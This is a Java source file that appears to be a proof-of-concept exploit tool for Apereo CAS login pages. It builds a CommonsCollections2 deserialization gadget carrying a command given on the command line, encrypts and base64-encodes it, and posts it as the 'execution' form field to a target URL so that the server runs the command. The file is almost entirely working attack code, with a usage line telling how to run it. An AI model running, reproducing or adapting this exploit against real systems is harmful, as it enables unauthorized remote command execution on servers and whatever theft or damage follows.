package org.unicodesec;


import org.apache.commons.io.IOUtils;
import org.apache.http.HttpVersion;
import org.apache.http.NameValuePair;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.message.BasicNameValuePair;
import org.apache.log4j.BasicConfigurator;
import org.apache.log4j.Level;
import org.apache.log4j.Logger;
import org.apache.log4j.PropertyConfigurator;
import sun.misc.BASE64Encoder;

import java.nio.charset.Charset;
import java.util.*;
import java.util.Map.Entry;

public class poc {

    public poc() {
    }

    public static void main(String[] args) throws Exception {
        String text = "   _____                  ______                \n" +
                "  / ____|                |  ____|               \n" +
                " | |        __ _   ___   | |__    __  __  _ __  \n" +
                " | |       / _` | / __|  |  __|   \\ \\/ / | '_ \\ \n" +
                " | |____  | (_| | \\__ \\  | |____   >  <  | |_) |\n" +
                "  \\_____|  \\__,_| |___/  |______| /_/\\_\\ | .__/ \n" +
                "                                         | |    \n" +
                "                                         |_|    \n" +
                "                          Powered by UnicodeSec  \n";
        System.out.println(text);
        if (args.length < 2) {
            System.out.println("java -jar cas-[version]-all.jar [url] [cmd]");
        } else {
            String url = args[0].trim();
            String cmd = args[1].trim();
            BASE64Encoder encoder = new BASE64Encoder();
            Object payloadObject = payloads.gadgets.CommonsCollections2.class.newInstance().getObject(cmd);
            EncryptedTranscoder et = new EncryptedTranscoder();
            byte[] encode = et.encode(payloadObject);
            String payload = encoder.encode(encode);
            System.out.println(String.format("executing command  %s", cmd));
            Map map = new HashMap();
            map.put("username", "13222233322");
            map.put("password", "Test1234");
            map.put("lt", "LT-215706-O4ejY5ldDQpHMB9WdQbe0trNaM28Wf-cas01.example.org");
            map.put("execution", "7b951c2a-e78f-4286-95fe-970782352a84_" + payload);
            map.put("_eventId", "submit");
            String result = "result：\n\t";
            System.out.println(result + doPost(url, map, url.startsWith("https")));
        }
    }

    public static String doPost(String apiUrl, Map<String, Object> params, boolean isSSL) throws Exception {
        CloseableHttpClient httpClient = HttpClients.createDefault();
        HttpPost httpPost = new HttpPost(apiUrl);

        List<NameValuePair> pairList = new ArrayList(params.size());
        Iterator var7 = params.entrySet().iterator();

        while (var7.hasNext()) {
            Entry<String, Object> entry = (Entry) var7.next();
            NameValuePair pair = new BasicNameValuePair(entry.getKey(), entry.getValue().toString());
            pairList.add(pair);
        }
        httpPost.setEntity(new UrlEncodedFormEntity(pairList, Charset.forName("UTF-8")));
        httpPost.setProtocolVersion(HttpVersion.HTTP_1_0);
        CloseableHttpResponse response;
        if (isSSL) {
            httpClient = new SSLClient();
        }
        response = httpClient.execute(httpPost);

        return IOUtils.toString(response.getEntity().getContent(), "utf-8");

    }

}
